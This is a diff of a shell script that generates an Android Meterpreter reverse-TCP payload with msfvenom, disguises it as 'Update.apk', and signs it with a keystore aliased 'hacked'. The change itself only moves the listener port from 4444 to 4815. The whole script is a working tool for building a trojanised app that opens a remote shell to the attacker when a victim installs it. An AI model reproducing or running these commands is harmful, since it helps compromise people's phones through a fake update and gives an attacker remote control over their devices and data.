@@ -12,10 +12,10 @@ fi
 # set IP msf will listen on
 myIp="$(hostname -I | cut -f1 -d' ')"
 echo "LHOST IP set to: "  $myIp
-echo "LPORT set to: 4444" 
+echo "LPORT set to: 4815" 
 
 # create payload
-msfvenom -p android/meterpreter/reverse_tcp LHOST="${myIp}"  LPORT=4444 R > Update.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST="${myIp}"  LPORT=4815 R > Update.apk
 
 # make keystore and sign the apk file
 keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
